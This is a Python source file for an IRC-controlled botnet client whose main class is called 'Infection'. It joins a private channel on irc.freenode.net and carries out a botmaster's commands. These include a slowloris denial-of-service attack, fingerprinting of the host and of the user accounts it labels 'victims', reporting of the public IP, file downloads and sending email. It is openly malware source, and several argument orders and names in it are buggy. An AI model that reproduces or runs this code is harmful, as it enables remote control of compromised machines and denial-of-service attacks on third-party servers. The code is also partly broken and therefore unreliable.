import socket, random, ssl
from time import time, sleep
botmasters = ["tjgerot"]
irc = 'irc.freenode.net'
port = 6667
botid = 0
channel = '##qdmdrqtvd'
chanpass = "helloworldasdf"
sck = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sck.connect((irc, port))
def post(msg, chat = False):
    if chat is True:
        if "\r\n" in msg:
            lines = msg.split("\r\n")
            for line in lines:
                sck.send(("PRIVMSG " + channel + " :" + line + "\r\n").encode("UTF8"))
                sleep(2)
        else:
            packet = "PRIVMSG " + channel + " :" + msg + "\r\n"
            sck.send(packet.encode("UTF8"))
    else:
        sck.send((msg + "\r\n").encode("UTF8"))
class Infection:
    def __init__(self):
        self.registered = False
        self.errors = []
        self.motd = False
        self.joined = False
        self.named = False
        self.birth = time()
        self.files = []
        self.node = None
        self.cod = None
        self.death = None
        self.victims = []
        self.distro = None
        self.pub_ip = None
        self.prv_ip = None
        self.system = None
        self.release = None
        self.version = None
        self.py_type = None
        self.machine = None
        self.processor = None
        self.py_version = None
        self.architecture = None
        self.multiprocessor = None
    def send_email(self, sender, password, recipient, subject, message, verbose = False):
        try:
            from smtplib import SMTP
            server = SMTP("smtp.gmail.com:587")
            server.ehlo()
            server.starttls()
            server.login(sender, password)
            msg = "\r\n".join(["From: " + sender, "To: " + recipient, "Subject: " + subject, "", message])
            server.sendmail(sender, recipient, msg)
            server.quit()
        except Exception as e:
            if verbose:
                post("Email failed to send.", True)
            self.errors.append("Email: [%s] %s" % (time(), e))
    def address(self, verbose = False):
        try:
            from urllib.request import urlopen
            self.pub_ip = urlopen("http://api.ipify.org/").read()
            if verbose:
                post(self.pub_ip, True)
        except Exception as e:
            if verbose:
                post("Failed to report external IP address.", True)
            self.errors.append("Address: [%s] %s" % (time(), e))
    def suicide(self, verbose = False):
        try:
            if verbose:
                post("Goodbye World!", True)
            self.cod = "Suicide"
            self.death = time()
            exit(0)
        except Exception as e:
            if verbose:
                post("Suicide failed.", True)
            self.errors.append("Suicide: [%s] %s" % (time(), e))
    def slowloris(self, host, sport, randuseragent, https, sockets, verbose = False):
        ip = host
        port = int(sport)
        https = "TRUE" in https.upper()
        socket_count = int(sockets)
        for _ in range(socket_count):
            try:
                s = init_socket(ip, port, https, randuseragent)
            except socket.error:
                break
            list_of_sockets.append(s)
        while True:
            for s in list(list_of_sockets):
                try:
                    s.send("X-a: {}\r\n".format(random.randint(1, 5000)).encode("utf-8"))
                except socket.error:
                    list_of_sockets.remove(s)
            for _ in range(socket_count - len(list_of_sockets)):
                try:
                    s = init_socket(ip, port, https, randuseragent)
                    if s:
                        list_of_sockets.append(s)
                except socket.error:
                    break
            sleep(15)
    def fingerprint(self, verbose = False):
        try:
            print("A", verbose)
            from platform import uname, architecture, platform, python_build, python_implementation, win32_ver
            from uuid import getnode as get_mac
            from os import listdir, stat
            print("Z")
            d = uname()
            a = architecture()
            b = python_build()
            print("Y")
            self.platform = platform()
            self.system = d.system
            if self.system == "Windows":
                self.multiprocessor = "Multi" in win32_ver()[2]
            elif self.system == "Linux":
                l = linux_distribution()
                self.distro = {"name": l[0], "version": l[1]}
            print("X")
            self.release = d.release
            self.mac = "".join(c + ":" if i % 2 else c for i, c in enumerate(hex(get_mac())[2:].zfill(12)))[:-1].upper()
            self.version = d.version
            self.machine = d.machine
            self.processor = d.processor
            self.node = d.node
            print("W")
            self.architecture = {"bits": a[0], "linkage": a[1]}
            self.py_version = {"version": b[0], "install_date": b[1]}
            self.py_type = python_implementation()
            print("B")
            if self.system == "Windows":
                vics = listdir("C:/Users")
                for a in vics:
                    if "." not in a and "Default" not in a and a != "Public" and a != "All Users":
                        self.victims.append(a)
            elif self.system == "Linux":
                for victim in listdir("/home"):
                    self.victims.append(victim)
            print("C")
            if verbose:
                print("0")
                post("OS: " + self.platform, True)
                vs = ""
                print("1")
                for vic in self.victims:
                    vs += vic + ","
                    print("2")
                    if len(self.platform) > 0:
                        post(self.platform + ": " + vs[:-1], True)
                    else:
                        prit("3")
                        post("Victims: " + vs[:-1], True)
            print("D")
        except Exception as e:
            print("H", e)
            if verbose:
                post("Fingerprinting failed.", True)
            self.errors.append("Fingerprint: [%s] %s" % (time(), e))
    def reconnect(self, verbose = False):
        try:
            if verbose:
                post("Reconnecting.", True)
            self.cod = "Reconnect"
            return False
        except Exception as e:
            if verbose:
                post("Reconnect failed.", True)
            self.errors.append("Reconnect: [%s] %s" % (time(), e))
    def download(self, url, filename, verbose = False):
        from urllib.request import urlretrieve
        try:
            urlretrieve(url, filename)
            self.files.append(filename)
            if verbose:
                post("Download successful.", True)
        except Exception as e:
            if verbose:
                post("Download failed.", True)
            self.errors.append("Download: [%s] %s" % (time(), e))
    def scan_range(self, ip_start, ip_stop, port_start, port_stop, verbose = False):
        try:
            pass
        except Exception as e:
            if verbose:
                post("Range scan failed.", True)
            self.errors.append("Scan Range: [%s] %s" % (time(), e))
    def scan(self, ip, port_start, port_stop, verbose = False):
        try:
            pass
        except Exception as e:
            if verbose:
                post("Scan failed.", True)
            self.errors.append("Scan: [%s] %s" % (time(), e))
    def interpretCommands(self, command):
        verbose = "VERBOSE" in command.split()[-1].upper()
        if "KILL" in command.split()[0].upper():
            post("Wilco.", True)
            self.suicide(verbose)
        elif "FINGERPRINT" in command.split()[0].upper():
            post("Wilco.", True)
            self.fingerprint(verbose)
        elif "RECONNECT" in command.split()[0].upper():
            post("Wilco.", True)
            return self.reconnect(verbose)
        elif "DOWNLOAD" in command.split()[0].upper():
            post("Wilco.", True)
            self.download(verbose, command.split()[1], command.split()[2])
        elif "EMAIL" in command.split()[0].upper():
            post("Wilco.", True)
            self.send_email(verbose, command.split()[1], command.split()[2], command.split()[3], command.split()[4], command.split()[5])
        elif "ADDRESS" in command.split()[0].upper():
            post("Wilco.", True)
            self.address(verbose)
        elif "SLOWLORIS" in command.split()[0].upper():
            post("Wilco.", True)
            self.slowloris(verbose, command.split()[1], command.split()[2], command.split()[3], command.split()[4], command.split()[5])
        elif "SCAN-RANGE" in command.split()[0].upper():
            post("Wilco.", True)
            pass
        elif "SCAN" in command.split()[0].upper():
            post("Wilco.", True)
            pass
        else:
            print("Unknown Command: " + command.split()[0])
list_of_sockets = []
user_agents = ["Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0","Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36","Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36","Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36","Mozilla/5.0 (Windows NT 10.0; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0","Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36","Mozilla/5.0 (Windows NT 6.1; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50","Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:49.0) Gecko/20100101 Firefox/49.0","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/602.2.14 (KHTML, like Gecko) Version/10.0.1 Safari/602.2.14","Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko","Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36","Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36","Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:49.0) Gecko/20100101 Firefox/49.0","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36","Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393"]
def init_socket(ip, port, https, randuseragent):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(4)
    if https:
        s = ssl.wrap_socket(s)
    s.connect((ip, port))
    s.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0, 2000)).encode("utf-8"))
    if randuseragent:
        s.send("User-Agent: {}\r\n".format(random.choice(user_agents)).encode("utf-8"))
    else:
        s.send("User-Agent: {}\r\n".format(user_agents[0]).encode("utf-8"))
    s.send("{}\r\n".format("Accept-language: en-US,en,q=0.5").encode("utf-8"))
    return s
def main():
    bot = Infection()
    data = ''
    while True:
        data = sck.recv(1024)
        parts = data.decode("UTF8").split("\r\n")
        for part in parts:
            if "PING" in part:
                post("PONG " + part.split()[1])
                print("NETWORK> Playing Ping Pong")
            if "Welcome to the freenode Internet Relay Chat Network" in part:
                bot.motd = True
            if bot.motd is False:
                if len(part) is 0:
                    pass
                elif part.split("!")[0].replace(":", "") in botmasters:
                    if "PRIVMSG" in part and part.split("PRIVMSG")[1].replace(channel + " :", "").strip().upper().startswith("COMMAND"):
                        live = bot.interpretCommands(part.split("PRIVMSG")[1].replace(channel + " :", "").strip().replace("COMMAND", "").replace("command", "").replace("Command", "").strip())
                        if live is False:
                            return True
                    elif "HELLO WORLD" in part.upper():
                        print("BOTMASTER> " + part.split("PRIVMSG")[1].replace(channel + " :", "").strip()) # TODO Remove print statment
                        post("Hello Master!", True)
                    else:
                        print("BOTMASTER> " + part.split("PRIVMSG")[1].replace(channel + " :", "").strip()) # TODO Remove print statment
                elif "NOTICE" in part:
                    print("SERVER> " + part.split("***")[1].strip()) # TODO Remove print statment
                elif "= " + channel in part:
                    print("NAMED> " + part.split(" ")[-1].strip()) # TODO Remove print statment
                elif "End of /NAMES list" in part:
                    bot.named = True
                elif " MODE " or " JOIN " + channel in part:
                    pass
                else:
                    print("CHAT> " + part) # TODO Remove print statment
            if "End of /MOTD command" in part:
                bot.motd = False
        if bot.registered is False:
            nick = "bot" + str(botid)
            post("NICK " + nick)
            post("USER " + nick + " " + nick + " " + nick + " :" + nick)
            bot.registered = True
        if bot.joined is False:
            post("JOIN " + channel + " " + chanpass)
            bot.joined = True
    print("#".encode("UTF8"), sck.recv(4096)) # TODO Remove print statment
if __name__ == "__main__":
    while True:
        main()
